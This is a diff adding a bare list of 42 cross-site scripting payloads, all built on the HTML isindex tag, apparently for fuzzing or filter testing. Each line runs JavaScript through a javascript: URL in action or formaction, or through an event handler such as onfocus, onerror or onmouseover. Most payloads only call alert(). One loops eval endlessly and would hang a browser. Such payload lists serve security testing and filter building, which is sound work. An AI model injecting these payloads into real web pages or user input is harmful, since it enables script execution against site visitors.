@@ -1,0 +1,42 @@
+<isindex action=javascript:alert(1) type=submit value=click> 
+<isindex action=javascript:alert(204) type=submit value=click>
+<isindex/**/alt=1+src=xss:window['alert']/**/(alt)+type=image+onerror=while(true){eval(src)}>
+<isindex/autofocus/onfocus=alert()>
+<isindex draggable="true" ondrag="alert(1)">test</isindex>
+<isindex draggable="true" ondragend="alert(1)">test</isindex>
+<isindex draggable="true" ondragenter="alert(1)">test</isindex>
+<isindex draggable="true" ondragleave="alert(1)">test</isindex>
+<isindex draggable="true" ondragstart="alert(1)">test</isindex>
+<isindex formaction=javascript:alert(1) type=submit value=click> 
+<isindex formaction=javascript:alert(210) type=submit value=click>
+<isindex id=x tabindex=1 onactivate=alert(1)></isindex>
+<isindex id=x tabindex=1 onbeforeactivate=alert(1)></isindex>
+<isindex id=x tabindex=1 onbeforedeactivate=alert(1)></isindex><input autofocus>
+<isindex id=x tabindex=1 ondeactivate=alert(1)></isindex><input id=y autofocus>
+<isindex id=x tabindex=1 onfocus=alert(1)></isindex>
+<isindex id=x tabindex=1 onfocusin=alert(1)></isindex>
+<isindex onbeforecopy="alert(1)" contenteditable>test</isindex>
+<isindex onbeforecut="alert(1)" contenteditable>test</isindex>
+<isindex onbeforepaste="alert(1)" contenteditable>test</isindex>
+<isindex onblur=alert(1) tabindex=1 id=x></isindex><input autofocus>
+<isindex onclick="alert(1)">test</isindex>
+<isindex oncontextmenu="alert(1)">test</isindex>
+<isindex oncopy="alert(1)" contenteditable>test</isindex>
+<isindex oncut="alert(1)" contenteditable>test</isindex>
+<isindex ondblclick="alert(1)">test</isindex>
+<isindex onfocusout=alert(1) tabindex=1 id=x></isindex><input autofocus>
+<isindex onkeydown="alert(1)" contenteditable>test</isindex>
+<isindex onkeypress="alert(1)" contenteditable>test</isindex>
+<isindex onkeyup="alert(1)" contenteditable>test</isindex>
+<isindex onmousedown="alert(1)">test</isindex>
+<isindex onmouseenter="alert(1)">test</isindex>
+<isindex onmouseleave="alert(1)">test</isindex>
+<isindex onmousemove="alert(1)">test</isindex>
+<isindex onmouseout="alert(1)">test</isindex>
+<isindex onmouseover="alert(1)">test</isindex>
+<isindex onmouseup="alert(1)">test</isindex>
+<isindex onpaste="alert(1)" contenteditable>test</isindex>
+<isindex type=image onload=alert(1) src=validimage.png>
+<isindex type=image src=1 onerror=alert(1)>
+<isindex type=image src=1 onerror=alert(XSS)>
+<isindex x="javascript:" onmouseover="alert(XSS)">
